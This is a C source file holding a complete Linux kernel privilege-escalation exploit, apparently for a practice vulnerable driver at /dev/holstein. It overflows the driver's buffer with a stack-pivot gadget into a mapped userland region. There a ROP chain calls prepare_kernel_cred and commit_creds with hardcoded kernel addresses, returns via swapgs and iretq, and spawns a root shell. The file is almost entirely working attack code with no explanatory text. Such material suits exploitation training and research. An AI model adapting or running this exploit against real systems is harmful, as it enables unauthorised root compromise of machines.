#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define BUFFER_SIZE 0x400/0x8
#define PIVOT_ADDR 0x39000000
#define PIVOT_MARGIN 0x20000 // accommodate `prepare_kernel_cred` and `commit_creds` stack frame

unsigned long mov_rdi_rax_rep = 0xffffffff8160c96b;
unsigned long pop_rdi = 0xffffffff8127bbdc;
unsigned long pop_rcx = 0xffffffff812ea083;
unsigned long swapgs = 0xffffffff8160bf7e;
unsigned long iretq = 0xffffffff810202af;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
unsigned long mov_esp_0x39000000 = 0xffffffff81507c8f;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;
void* userland_rop;

void save_state() {
    asm volatile(
        ".intel_syntax noprefix;"
        "mov _proc_cs, cs;"
        "mov _proc_ss, ss;"
        "mov _proc_rsp, rsp;"
        "pushf;"
        "pop _proc_rflags;"
        ".att_syntax"
        );

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void spawn_shell()
{
    puts("[+] Hello Userland!");

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();
    
    int fd = open(DEVICE, O_RDWR);
    if (fd < 0) {
        perror("[-] open");
        exit(1);
    }
    printf("[+] device opened at: %d\n", fd);

    userland_rop = mmap((void*) PIVOT_ADDR-PIVOT_MARGIN, PIVOT_MARGIN*2, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED|MAP_POPULATE, -1, 0);
    if (userland_rop <= 0) {
        perror("[-] mmap");
        exit(1);
    }
    printf("[+] userland_rop mapped at: %p\n", userland_rop);

    unsigned long* chain = (unsigned long*) PIVOT_ADDR;
    printf("[+] userland_rop chain at: %p\n", chain);
    *chain++ = pop_rdi;
    *chain++ = 0x0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rcx;
    *chain++ = 0x0;
    *chain++ = mov_rdi_rax_rep;
    *chain++ = commit_creds;
    *chain++ = swapgs;
    *chain++ = iretq;
    *chain++ = (unsigned long) &spawn_shell;
    *chain++ = _proc_cs;
    *chain++ = _proc_rflags;
    *chain++ = _proc_rsp;
    *chain++ = _proc_ss;

    unsigned long payload[BUFFER_SIZE+0x20] = {0x0};
    payload[BUFFER_SIZE+01] = mov_esp_0x39000000;

    if (write(fd, payload, sizeof(payload))) {
        perror("[-] write");
        exit(1);
    }

    printf("[*] ...\n");
    getchar();   
}